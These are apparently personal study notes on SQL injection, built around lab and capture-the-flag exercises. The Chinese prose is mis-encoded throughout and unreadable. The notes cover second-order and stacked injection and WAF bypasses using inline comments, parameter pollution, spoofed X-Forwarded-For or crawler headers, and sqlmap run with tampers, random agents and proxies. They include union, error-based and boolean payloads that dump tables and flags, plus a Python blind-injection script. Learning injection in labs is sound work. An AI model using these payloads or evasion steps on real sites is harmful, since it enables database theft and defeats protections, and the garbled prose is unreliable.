- è·¨è¯­è¨€çš„åº”ç”¨ï¼Œå®¹æ˜“å¯¼è‡´é—®é¢˜ã€‚æ¯”å¦‚å‰å°PHPï¼Œåå°java
- æ—¥å¿—ç›¸å…³ï¼šå­˜æ—¥å¿—æ—¶ï¼Œè¯»å–äº†ä¸€äº›æ•°æ®åº“é‡Œçš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨æˆ·åç­‰ï¼Œç„¶ååˆå­˜å‚¨äº†ä¸€æ¬¡
- è·¨ç¨‹åºçš„æ•°æ®ä¼ é€’ï¼šç¨‹åºAå¤„ç†å®Œåå­˜å‚¨åˆ°æ•°æ®åº“ï¼Œç¨‹åºBå»è¯»å–ï¼Œæœªè¿›è¡Œè¿‡æ»¤





- **äºŒæ¬¡æ³¨å…¥æ¼æ´æŒ–æ˜æ€è·¯æœ‰å“ªäº›**

ï¼ˆ1ï¼‰æ•°æ®åº“å­˜å‚¨æœªè½¬ä¹‰ï¼Œå¤§å¤šæ¥è¯´ï¼Œå­˜å‚¨åˆ°æ•°æ®åº“ä¸­çš„ä¸œè¥¿åªæ˜¯åšäº†è¡¨é¢çš„è½¬ä¹‰ï¼Œå®è´¨ä¸Šåº“é‡Œå­˜å‚¨çš„è¿˜æ˜¯åŸå§‹çŠ¶æ€çš„å†…å®¹ï¼Œåœ¨å¤šæ•°è¯»å–æœªæ ¡éªŒçš„æƒ…å†µä¸‹ï¼Œå¯è¾“å…¥ç‰¹æ®Šå­—ç¬¦å¹¶åœ¨é¡µé¢ä¸Šå®Œæ•´æ˜¾ç¤ºçš„éƒ¨åˆ†ï¼Œæœ‰å¯èƒ½å­˜åœ¨äºŒæ¬¡æ³¨å…¥çš„å¯èƒ½ã€‚

ï¼ˆ2ï¼‰å¼ºäº¤äº’éƒ¨åˆ†ï¼ŒSQLæ³¨å…¥æ˜¯éœ€è¦ä¸æ•°æ®åº“è”åŠ¨çš„ï¼Œä½†å¾€å¾€åœ¨ç™»å½•ã€ä¿®æ”¹å†…å®¹ã€å‘å¸ƒå†…å®¹ç­‰åŠŸèƒ½ä¸Šå¿½ç•¥äº†å†å²æ•°æ®è¿™ä¸€ç‚¹ï¼Œæ‰€ä»¥åœ¨é‡åˆ°æœ‰ä¿®æ”¹è´¦æˆ·å¯†ç ã€å‘å¸ƒç•™è¨€ã€å‘å¸ƒå†…å®¹çš„éƒ¨åˆ†ï¼Œå¤§å®¶ä¸å¦¨å»è¯•è¯•æ³¨å†Œä¸€ä¸ªtestæˆ–è€…adminâ€™--æˆ–è€…adminè´¦å·ï¼Œç„¶ååœ¨æµ‹è¯•å›å¤çš„å†…å®¹æˆ–è€…ä¿®æ”¹çš„å†…å®¹æ˜¯å¦è¾¾åˆ°é¢„æœŸã€‚å¦‚æœä¸é¢„æœŸä¸ç¬¦ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½å°±å­˜åœ¨äºŒæ¬¡æ³¨å…¥ï¼Œæ­¤æ—¶åœ¨ç²¾å¿ƒæ„é€ sqlè¯­å¥å³å¯ã€‚

ï¼ˆ3ï¼‰é˜²å¾¡ç»•è¿‡ï¼Œæœ‰äº›åœ°æ–¹æ˜æ˜¾å­˜åœ¨å¼‚å¸¸ï¼Œä½†æ˜¯åˆåšäº†ä¸€äº›é™åˆ¶ï¼Œæ¯”å¦‚å¹´é¾„ï¼Œé™åˆ¶äº†å­—æ®µä¸ºis_numericï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡è½¬æ¢è¿›åˆ¶ï¼Œ16è¿›åˆ¶ç­‰æ–¹å¼å°†å…¶å½•å…¥ï¼ŒæŸ¥è¯¢æ—¶çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œé‡åˆ°å…¶ä»–çš„é™åˆ¶ï¼Œè·Ÿxssç»•è¿‡åŸç†ä¸€æ ·ï¼Œå¤§å®¶å¯ä»¥è„‘æ´å¤§å¼€ï¼Œæä¸€äº›æ•°æ®åº“å¯ä»¥è§£æçš„ç¼–ç è¿›å»ã€‚

ï¼ˆ4ï¼‰å¤šå½•å…¥å¼‚å¸¸å†…å®¹ï¼Œå¤šè§‚å¯Ÿè¿”å›ç»“æœï¼Œå‡¡æ˜¯ä¸è‡ªå·±å½•å…¥çš„å†…å®¹ä¸ä¸€è‡´çš„åœ°æ–¹ï¼Œå°±å¯ä»¥å»çœ‹çœ‹æ˜¯å¦å­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚

**é»‘ç›’æµ‹è¯•**ï¼šè§‚å¯Ÿèƒ½è·å¾—å“ªäº›ä¿¡æ¯ï¼Œå¯ä»¥æ·»åŠ å“ªäº›ä¿¡æ¯ï¼Œå“ªäº›ä¿¡æ¯å¯ä»¥ä¿®æ”¹ï¼Œè¿˜å¯ç›²çŒœåˆ—åå®ç°ä¸åŒåœ°æ–¹updateæ—¶å›æ˜¾æ³¨å…¥è¯­å¥



- <span style="background:#FF9999;">æ³¨æ„ï¼</span>
  - is_numericå¯ä»¥ç”¨16è¿›åˆ¶ç¼–ç `hex()`ç»•è¿‡ã€‚



```
å½“è®¿é—®username=testâ€™&password=123æ—¶ï¼Œæ‰§è¡Œçš„SQLè¯­å¥ä¸ºï¼š 
insert into users(username,password) values ( â€˜ test\ â€™ ',â€˜202cb962ac59075b964b07152d234b70â€™)æ•°æ®åº“ä¸­å°±å˜æˆäº†
test'  123
æŸ¥è¯¢å¯¹åº”idæ—¶
Select * from person where â€˜usernameâ€™=â€˜testâ€™â€™ //å‘ç”Ÿæ³¨å…¥ï¼Œç”±äºå¤šäº†ä¸€ä¸ªå•å¼•å·ï¼Œæ‰€ä»¥é¡µé¢ä¼šæŠ¥é”™ã€‚
```





#### å †å æ³¨å…¥

> sqlilabå¤©ä¹¦ 38å…³

â€‹	å«ä¹‰ï¼šå¤šä¸ªsqlè¯­å¥ä»¥ï¼›æ”¾åœ¨ä¸€èµ·

â€‹	æ•°æ®åº“åˆ†å·ï¼›ä»£è¡¨è¯­å¥ç»“æŸ=ã€‹æŒ‰é¡ºåºè¿›è¡Œ

æˆ‘ä»¬æ˜¯ç”¨mysql_query()æ¥æ”¶çš„sqlè¯­å¥ã€‚è€Œmysql_query()å®ƒæœ¬èº«åªèƒ½æ‰§è¡Œä¸€å¥sqlè¯­å¥ï¼Œæ‰€ä»¥å°±ä¼šå‡ºé”™ã€‚æŠŠmysql_query()æ¢ä¸ºmysqli_multi_query()å°±å¯ä»¥æ‰§è¡Œå¤šæ¡sqlè¯­å¥æŸ¥è¯¢ã€‚ä½†mysqli_multi_query()çš„è¿”å›ç±»å‹ä¸ºå¸ƒå°”å‹ã€‚

â€‹	å¹¶ä¸æ˜¯æ‰€æœ‰æ•°æ®åº“éƒ½æ”¯æŒå †å æŸ¥è¯¢ï¼š<span style="background:#bbffff;">æ”¯æŒå †å æ•°æ®åº“ç±»å‹ï¼šMYSQL MSSQL Postgresqlç­‰</span>



- ç”¨å¤„

  //æ³¨å…¥éœ€è¦ç®¡ç†å‘˜å¸å·å¯†ç ï¼Œå¯†ç æ˜¯åŠ å¯†ï¼Œæ— æ³•è§£å¯†
  //å †å æ³¨å…¥è¿›è¡Œæ’å…¥æ•°æ®ï¼Œç”¨æˆ·å¯†ç è‡ªå®šä¹‰çš„ï¼Œå¯ä»¥æ­£å¸¸è§£å¯†ç™»å½•ã€è‡ªå·±æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜è´¦å·å¯†ç ã€‘

- æ³¨æ„âš 
  - **å †å æ³¨å…¥éœ€è¦æ¡ä»¶**ï¼Œåœ¨æºä»£ç å…³äºsqlæ˜¯å¯ä»¥å¤šæ¡è¯­å¥æ‰§è¡Œæƒ…å†µä¸‹å¯ä»¥å †å æ³¨å…¥ï¼Œå¦åˆ™ä¸è¡Œï¼Œä¸ä¼šæ‰§è¡ŒSQLè¯­å¥ï¼Œä¼šæŠ¥é”™
  - 

### ğŸ›¡WAFç»•è¿‡

> Sqlilabs-Less38-å †å æ³¨å…¥(å¤šè¯­å¥)

> ***[WAF Bypassæ•°æ®åº“ç‰¹æ€§](https://www.secpulse.com/archives/94962.html)

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439852.png" alt="image-20210808104332262" style="zoom:67%;" />



> wafè½¯ä»¶ï¼šé˜¿é‡Œäº‘ç›¾ï¼Œå®å¡”ï¼Œå®‰å…¨ç‹—

- %0a æ˜¯æ¢è¡Œç¬¦ï¼Œ%23 æ˜¯#

#### å‚æ•°æ±¡æŸ“

â€‹	æœ‰å¤šä¸ªå‚æ•°ï¼Œä»¥å“ªä¸ªå‚æ•°ä¸ºå‡†

â€‹	æœåŠ¡å™¨å¤„ç†å‚æ•°ï¼š

![image-20210808165140675](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439853.png)

```
ä¾‹å¦‚apacheï¼š
?y=1&y=2
GETæœ€åyæ˜¯2
```



å‚æ•°æ±¡æŸ“+ç‰¹æ®Šç¬¦å·æ³¨é‡Š

```
id=-1/**&id=-1%20union%20select%201,2,3%23*/
å³id=-1 union select 1,2,3#*/
```

![image-20210808170638727](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439854.png)

- sqlæ³¨é‡Š

```
SQLæ³¨é‡Š

ã€€ã€€å•è¡Œæ³¨é‡Šã€€ã€€#åé¢ç›´æ¥åŠ å†…å®¹

ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€--åé¢å¿…é¡»åŠ ç©ºæ ¼

ã€€ã€€å¤šè¡Œæ³¨é‡Šã€€ã€€/**/ä¸­é—´å¯è·¨è¡Œ

ã€€ã€€-- + ä¼šåˆ é™¤
```



- å†…è”æ³¨é‡Šï¼Ÿ

MySQLæ•°æ®åº“ä¸ºäº†ä¿æŒä¸å…¶ä»–æ•°æ®åº“å…¼å®¹ï¼Œç‰¹æ„æ–°æ·»åŠ çš„åŠŸèƒ½ã€‚ ä¸ºäº†é¿å…ä»MySQLä¸­å¯¼å‡ºçš„SQLè¯­å¥ä¸èƒ½è¢«å…¶ä»–æ•°æ®åº“ä½¿ç”¨ï¼Œå®ƒæŠŠä¸€äº› MySQLç‰¹æœ‰çš„è¯­å¥æ”¾åœ¨ `/*! ... */` ä¸­ï¼Œè¿™äº›è¯­å¥åœ¨ä¸å…¼å®¹çš„æ•°æ®åº“ä¸­ä½¿ç”¨æ—¶ä¾¿ ä¸ä¼šæ‰§è¡Œã€‚è€ŒMySQLè‡ªèº«å´èƒ½è¯†åˆ«ã€æ‰§è¡Œã€‚  ==`/*!50001 */`è¡¨ç¤ºæ•°æ®åº“ç‰ˆæœ¬>=5.00.01æ—¶ä¸­é—´çš„è¯­å¥æ‰ä¼šæ‰§è¡Œã€‚==åœ¨SQLæ³¨å…¥ä¸­ï¼Œå†…è”æ³¨é‡Šå¸¸ç”¨æ¥ç»•è¿‡wafã€‚

âš ï¸ä¸ä¸€å®šæ˜¯å“ªä¸ªç‰ˆæœ¬å°±å…è®¸äº†ï¼Œå¯ä»¥å†™pythonè„šæœ¬è·‘å‡ºæ¥ 

<span style="background:#FF9999;">è¿™æ˜¯MYSQLç‰¹æ€§ï¼š</span>

```
/*!select * from users*/;   //å¯ä»¥æ‰§è¡Œ
id=-1%20union%20/*!44509select*/1,2,3 //å¯ä»¥ç»•è¿‡waf

è¿˜å¯ä»¥
union%20all%23%0a%20select%201,2,3%23 //åŠ ä¸åŠ allæ•ˆæœä¸€æ ·
```







æ¨èç”¨FUZZæ¨¡ç³Šæµ‹è¯•=ã€‹è„šæœ¬è·‘ï¼Œä¸€ä¸ªä¸ªè¯•æ•ˆç‡ä½

```
SELECT * FROM users WHERE id=-1/*%0a*/union/*%0a*/select/*%0a*/1, 2,3;

id =-1 union%23a%0Aselect 1,2,3;%23  
ä¹Ÿå°±æ˜¯id =-1 union #a
select 1,2,3;#    //æ³¨æ„#æ˜¯å•è¡Œæ³¨é‡Šï¼Œaä¸ºäº†éš”å¼€ï¼Œå†åŠ ä¸ªä¿è¯


id =-1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23

```
#### salmap tamper
åˆ©ç”¨sqlmap tamperæ’ä»¶å‚æ•°ï¼Œå¯¹åº”æ–‡ä»¶å¤¹ä¸‹æœ‰å„ç§è‡ªå¸¦è„šæœ¬ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±å†™ç„¶åç”¨ä¸Š
```
python sqlmap.py -u "http://127.0.0.1/test.php?id=1" --tamper=dog.py --proxy=http://127.0.0.1:8080   proxyæ˜¯å¼€å¯ä»£ç†ï¼Œå¯ç”¨burpæŸ¥çœ‹è¯·æ±‚ä¿¡æ¯
```
##### ç»•è¿‡å·¥å…·æ£€æµ‹
âš ï¸sqlmapè¯·æ±‚æ—¶useragentä¼šå¸¦ä¸Šsqlmapçš„æŒ‡çº¹ï¼Œå®‰å…¨ç‹—æ£€æµ‹åˆ°ä¼šæ‹¦æˆªï¼Œ==å·¥å…·ç›´æ¥è¢«æ‹¦æˆª==

=ã€‹å¯¹æ­¤æˆ‘ä»¬ä¿®æ”¹useragentå³å¯ç»•è¿‡æ‹¦æˆªï¼Œsqlmapä¹Ÿæœ‰å‚æ•°ä¿®æ”¹å¤´
`python sqlmap.py -u "http://127.0.0.1/test.php?id=1" --tamper=dog.py --proxy=http://127.0.0.1:8080 --random-agent`ä½¿ç”¨è‡ªå¸¦å­—å…¸éšæœºå¤´è®¿é—®

âš ï¸sqlmapå¤ªæ…¢äº†å¯èƒ½æ˜¯phpç‰ˆæœ¬è¿‡é«˜ï¼Œ5.2.ã€‚ã€‚è¯•è¯•

##### ç»•è¿‡æµé‡æ£€æµ‹

å®‰å…¨ç‹—çš„æµé‡é˜²æŠ¤æ˜¯æ£€æµ‹è®¿é—®é€Ÿåº¦ã€åŒä¸€ipè®¿é—®å¤šæ¬¡ä¼šè¢«banã€‘

=ã€‹**å¯ä»¥å»¶æ—¶ã€ä»£ç†æ± ã€çˆ¬è™«** ç»•è¿‡

1. çˆ¬è™«
> ç™¾åº¦ æœç´¢å¼•æ“çˆ¬è™«httpå¤´

- sqlmapä¹Ÿå¯ä»¥è‡ªå®šä¹‰useragentå¤´
- åœ¨sqlmapç›®å½•ä¸‹`lib/core/option.py`é‡Œçš„1425è¡Œ
- æˆ–è€…åŠ å‚æ•°`--user-agent="xxx"`

2. å»¶æ—¶
- `--delay 1` éš”1så‘ä¸€ä¸ªæ•°æ®åŒ…

3. ä»£ç†æ± 

æ‹¦ä¸€ä¸ªipæˆ‘æ¢ä¸€ä¸ªï¼Œpythonçˆ¬è™«è„šæœ¬æœ‰å…³


##### æ€»ç»“
âš ï¸ç±»ä¼¼çš„ï¼Œè‹¥å¯¹å…¶ä»–åœ°æ–¹å¤´æœ‰æ‹¦æˆªï¼Œå†™pythonè„šæœ¬ï¼Œ--tamperåŠ ä¸Šã€ä¸­è½¬è„šæœ¬ã€‘

ä¹Ÿå¯ä»¥`-r 3.txt`æŠŠä¿®æ”¹åçš„è¯·æ±‚æŠ¥æ–‡æ”¾åˆ°txté‡Œï¼Œä¸è¦-uï¼Œç”¨-rè¯·æ±‚æ–‡ä»¶ä¹Ÿå¯ä»¥å®ç°è‡ªä¸»ç»•è¿‡
- å³sqlmapæ³¨å…¥æœ¬åœ°è„šæœ¬åœ°å€ï¼Œ=ã€‹æœ¬åœ°æ­å»ºè„šæœ¬ï¼ˆè¯·æ±‚æ•°æ®åŒ…è‡ªå®šä¹‰ç¼–å†™ï¼‰=ã€‹ç›®æ ‡åœ°å€
> ç™¾åº¦ phpè‡ªå®šä¹‰httpæ•°æ®åŒ…è¯·æ±‚


#### ç™½åå•ç»•è¿‡
1. ipç™½åå•
è·å–å¯¹æ–¹æœåŠ¡å™¨ä¸ä¼šæ‹¦æˆªçš„ipç™½åå•ï¼Œä¿®æ”¹è‡ªå·±http header  `x-forwarded-for ..`ç­‰æ¥ç»•è¿‡å®‰å…¨ç‹—æ‹¦æˆªã€ä¸€èˆ¬ä¸å¥½è·å–ï¼Œè·å¾—å¯¹æ–¹æœåŠ¡å™¨æœ¬èº«çš„ipæ›´å®¹æ˜“ï¼Œè‡ªå·±ä¸ä¼šé˜²è‡ªå·±ï¼Œä¹Ÿå¯ä»¥ç»•è¿‡ã€‘
2. é™æ€èµ„æº
ä»¥å‰å¯ä»¥ç”¨ï¼Œç°åœ¨ä¸ä¸€å®š
å¸¸è§çš„é™æ€æ–‡ä»¶ï¼š`.js .txt .jpg  .swf  .css`ç­‰ï¼Œç±»ä¼¼ç™½åå•æœºåˆ¶ï¼Œwafä¸ºäº†æ£€æµ‹æ•ˆç‡ï¼Œä¸ä¼šæ£€æµ‹è¿™ç±»æ–‡ä»¶ååç¼€çš„è¯·æ±‚
`http://127.0.0.1/test.php?id=1`æ”¹ä¸º`http://127.0.0.1/test.php/1.js?=1`é¡µé¢ä¸ä¼šå˜ï¼Œä½†èƒ½ç»•è¿‡æ£€æµ‹
âš ï¸==Aspxã€phpåªè¯†åˆ«åˆ°å‰é¢çš„`.Aspxã€.php`åé¢ä¸è¯†åˆ«==

3. urlç™½åå•
wafå†…ç½®ç™½åå•ï¼Œåªè¦urlä¸­å­˜åœ¨ç™½åå•çš„å­—ç¬¦ä¸²ï¼Œå°±ä¸æ£€æµ‹

4. çˆ¬è™«ç™½åå•
é€šè¿‡å¯¹æ•°æ®åŒ…ä¼ªé€ æˆæœç´¢å¼•æ“è®¿é—®ï¼Œè‡´ä½¿wafè®¤ä¸ºè®¿é—®å®‰å…¨
  - `UserAgent`ï¼Œä¿®æ”¹æˆæœç´¢å¼•æ“çš„ç›¸å…³æŒ‡çº¹ï¼Œwafä¸€æ—¦æ£€æµ‹åˆ°è¿™ä¸ªå°±ä¸å»ç®¡å®ƒäº†ï¼Œå¦åˆ™ä¼šå› å¤šæ¬¡è®¿é—®è€Œé¡µé¢æ˜¾ç¤ºæ‹¦æˆª



## sqlè¯­æ³•

1. ==[ limitè¯­å¥](==https://www.yiibai.com/sql/sql-limit.html)ï¼šé™åˆ¶æ˜¾ç¤ºå¤šå°‘è¡Œï¼Œoffsetï¼šè·³è¿‡å‰å‡ è¡Œ

   - mysqlé‡Œå¯ä»¥çœå»offsetï¼š`LIMIT x,y` ï¼šè·³è¿‡å‰xè¡Œå–yè¡Œ

2. `midï¼ˆstring,start,lengthï¼‰`ç±»ä¼¼äºsubstrï¼Œè¿”å›åˆ¶å®šé•¿åº¦å­—ç¬¦ä¸²å­ä¸²ã€**å­—ç¬¦ä¸²ä»1å¼€å§‹**ã€‘

3. `like '%aa'`  åŒ¹é…ä»¥aaç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œ`%`ï¼šåŒ¹é…0ä¸ª/ä¸€ä¸ª/å¤šä¸ªï¼Œ `_` åŒ¹é…ä¸€ä¸ª 

4. [sqlé‡Œçš„åå¼•å·](https://www.jianshu.com/p/36363f4190df)ï¼šåŒºåˆ†ä¿ç•™å­—ï¼Œä»¥å…å‡ºé”™ï¼Œå¦‚

   ```sql
   SELECT `select` FROM `test` WHERE select='å­—æ®µå€¼'
   ```


5. åˆ«åas xxxï¼Œaså¯ä»¥çœç•¥









## ğŸ”—å‚è€ƒèµ„æ–™

[å…¬ä¼—å·ï¼Œç›¸å…³å‡½æ•°ã€æŠ¥é”™æ³¨å…¥å¸ƒå°”æ³¨å…¥ã€æ—¶é—´æ³¨å…¥ï¼Œåˆçº§ï¼Œé…æœ‰å°ä¾‹å­](https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247484372&idx=1&sn=ffcc51a88c9acf96c312421b75fc2a26&chksm=ec1e33fcdb69baea53838fd545a236c0deb8a42f3b341ee0879c9e4ac9427c2147fab95b6669#rd)









# åˆ·é¢˜âœï¸

### æ•´æ•°å‹

1. åˆ¤æ–­æ˜¯æ•´æ•°å‹è¿˜æ˜¯å­—ç¬¦å‹ï¼Œæœ‰åŒºåˆ«=ã€‹æ•´æ•°å‹

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439855.png" alt="image-20210719143944632" style="zoom: 50%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439856.png" alt="image-20210719144008063" style="zoom:50%;" />

2. åˆ¤æ–­åˆ—æ•°ï¼Œorder by3é¡µé¢ä¸æ˜¾ç¤ºï¼Œåˆ™æ˜¯2åˆ—

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439857.png" alt="image-20210719144050954" style="zoom:50%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439858.png" alt="image-20210719144101587" style="zoom:50%;" />

3. unionï¼Œ**æ³¨æ„ç¬¬ä¸€ä¸ªå‚æ•°è¦æ— æ•ˆï¼å¦åˆ™unionåé¢çš„ä¸æ˜¾ç¤º**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439859.png" alt="image-20210719144344234" style="zoom:50%;" />



4. æ‰¾å½“å‰åº“ä¸‹æ‰€æœ‰è¡¨å

```url
http://challenge-a1d9c1878cb3631f.sandbox.ctfhub.com:10800/?id=-1 union  select database(),group_concat(table_name) from information_schema.tables where table_schema=database()
```

![image-20210719144701149](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439860.png)



5. è·å–ç‰¹å®šè¡¨åˆ—åã€==æ³¨æ„åˆ—åè¦åŠ å¼•å·==ã€‘

```
?id=-1 union  select database(),group_concat(column_name) from information_schema.columns where table_name='flag'
```

![image-20210719144940366](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439861.png)

6. è·å–å…·ä½“æ•°æ®ã€æ³¨æ„å¼•å·ï¼ã€‘

```
?id=-1 union  select database(),flag from flag
```

![image-20210719145233031](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439862.png)



### sqli_labså­—ç¬¦æ³¨å…¥

1. å‘ç°æ˜¯å­—ç¬¦æ³¨å…¥

è”åˆæ³¨å…¥ï¼š

â€‹	- çˆ†åº“å

â€‹	**å¯ç›´æ¥ç”¨hackbarè¾“å‡ºï¼Œå·¦è¾¹3æ˜¯éœ€3åˆ—æ‰å›æ˜¾ï¼Œå³è¾¹æ˜¯æŠŠè¾“å‡ºæ”¾åœ¨ç¬¬å‡ åˆ—å›æ˜¾**

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439863.png" alt="image-20210523111629531" style="zoom:50%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439864.png" alt="image-20210523111656991" style="zoom: 50%;" />

```mysql
http://localhost/sqli-labs-master/Less-1/?id='union select 1,group_concat(schema_name),3 from information_schema.schemata%23
```

â€‹	- çˆ†è¡¨å

```mysql
http://localhost/sqli-labs-master/Less-1/?id='union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23
```

â€‹	- çˆ†æ‰€æœ‰åº“åˆ—å

```mysql
http://localhost/sqli-labs-master/Less-1/?id='union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()%23
```

â€‹	- çˆ†å½“å‰åº“ä¸‹æŒ‡å®šè¡¨åˆ—å

```mysql
http://localhost/sqli-labs-master/Less-1/?id='union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'%23
```



æ— åˆ—åæŠ¥é”™æ³¨å…¥joinæŸ¥åˆ—åã€è¿™æ—¶æ— éœ€ä¿è¯å­—æ®µæ•°ä¸º3ï¼Œç›´æ¥union select å³å¯ã€‘

```mysql
http://localhost/sqli-labs-master/Less-1/?id='union select * from (select * from users as a join users b using(id,username))c%23
//æˆ–è€…åŠ ä¸Šextractvalueï¼Œæ•ˆæœä¸€æ ·
http://localhost/sqli-labs-master/Less-1/?id='union select extractvalue(0x0a,concat(0x0a,(select * from (select * from users as a join users b using(id,username))c)))%23
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439865.png" alt="image-20210523113654148" style="zoom:67%;" />



### æŠ¥é”™æ³¨å…¥

1. å‘ç°æ˜¯æ•´æ•°ï¼Œ2åˆ—

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439866.png" alt="image-20210719153315081" style="zoom:67%;" />

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439867.png" alt="image-20210719153236931" style="zoom:67%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439868.png" alt="image-20210719153122597" style="zoom:67%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439869.png" alt="image-20210719153213247" style="zoom: 67%;" />



2. åˆ©ç”¨**hackbarçš„å¿«æ·é”®**extractvalueæŠ¥é”™æ³¨å…¥

```
?id=extractvalue(0x0a,concat(0x0a,(select database())))
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439870.png" alt="image-20210719154014631" style="zoom:67%;" />

4. æŸ¥è¡¨å

```
?id=extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database())))
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439871.png" alt="image-20210719154125986" style="zoom:67%;" />

5. æŸ¥åˆ—å

```
?id=extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_schema=database())))
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439872.png" alt="image-20210719154218790" style="zoom:67%;" />

6. æŸ¥æ•°æ®

```
?id=extractvalue(0x0a,concat(0x0a,(select group_concat(flag) from flag)))
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439873.png" alt="image-20210719154257406" style="zoom:67%;" />



### å¸ƒå°”æ³¨å…¥

> [wp](https://blog.csdn.net/Xxy605/article/details/109750292?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242)

1. æ•´æ•°å‹ï¼Œ2åˆ—

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439874.png" alt="image-20210719155150592" style="zoom:67%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439875.png" alt="image-20210719155311112" style="zoom:67%;" />

2. æŸ¥æ‰¾æœ‰æ— å«flagåˆ—åçš„è¡¨=ã€‹æœ‰

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439876.png" alt="image-20210719155428893" style="zoom:80%;" />

3. æŸ¥è¯¢å½“å‰åº“ä¸‹æœ‰å‡ ä¸ªè¡¨ï¼Œã€==æ³¨æ„ï¼ç”¨and==ï¼Œorä¸€å®šè¿”å›successã€‘=ã€‹ä¸¤ä¸ªè¡¨

```
?id=1 and (select count( TABLE_NAME) from information_schema.TABlES where TABLE_SCHEMA=database( ) ) =2
```

![image-20210719160304316](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439877.png)

3. è·å–ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦=ã€‹4=ã€‹**æ€€ç–‘è¡¨åå«flag

```
?id=1 and (select length( TABLE_NAME) from information_schema.TABlES where TABLE_SCHEMA=database( ) limit 0,1) =4
?id=1 and (select length( TABLE_NAME) from information_schema.TABlES where TABLE_SCHEMA=database( ) limit 1,1) =4  ã€ç¬¬äºŒä¸ªè¡¨åä¹Ÿæ˜¯4é•¿åº¦ã€‘
```

![image-20210719160513618](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439878.png)



3. æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸‹ä¸¤ä¸ªè¡¨åç¬¬ä¸€ä¸ªå­—æ¯æ˜¯ä¸æ˜¯f

```
?id=1 and mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database( ) limit 0,1) ,1,1) ='f'ã€ç¬¬ä¸€ä¸ªè¡¨æŠ¥é”™ï¼Œè¯´æ˜ç¬¬äºŒä¸ªè¡¨åæ˜¯flagã€‘
?id=1 and mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database( ) limit 1,1) ,1,1) ='f'ã€successã€‘
```

![image-20210719161041707](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439879.png)

4. åé¢==ç”¨pythonè‡ªåŠ¨åŒ–è„šæœ¬å¸ƒå°”ç›²æ³¨çˆ†ç ´==ã€è¦è·‘ä¸€ä¼šã€‘

```python
é‡ç‚¹ä»£ç ï¼š
#å¯¹æŒ‡å®šåº“æŒ‡å®šè¡¨æŒ‡å®šåˆ—çˆ†æ•°æ®ï¼ˆflagï¼‰
def getData(database,table,column,str_list):
	#åˆå§‹åŒ–flagé•¿åº¦ä¸º1
    j = 1
    #jä»1å¼€å§‹ï¼Œæ— é™å¾ªç¯flagé•¿åº¦
    while True:
    	#flagä¸­æ¯ä¸€ä¸ªå­—ç¬¦çš„æ‰€æœ‰å¯èƒ½å–å€¼
        for i in str_list: #str_listæ˜¯å­—æ¯è¡¨çš„ASCIIç 
            new_url = url + "?id=1 and substr((select {} from {}.{}),{},1)='{}'".format(column,database,table,j,chr(i))
            r = requests.get(new_url)
            #å¦‚æœè¿”å›çš„é¡µé¢æœ‰query_successï¼Œå³ç›²çŒœæˆåŠŸï¼Œè·³è¿‡ä½™ä¸‹çš„forå¾ªç¯
            if success_mark in r.text:
            	#æ˜¾ç¤ºflag
                print(chr(i),end="")
                #flagçš„ç»ˆæ­¢æ¡ä»¶ï¼Œå³flagçš„å°¾ç«¯å³èŠ±æ‹¬å·
                if chr(i) == "}":
                    print()
                    return 1
                break
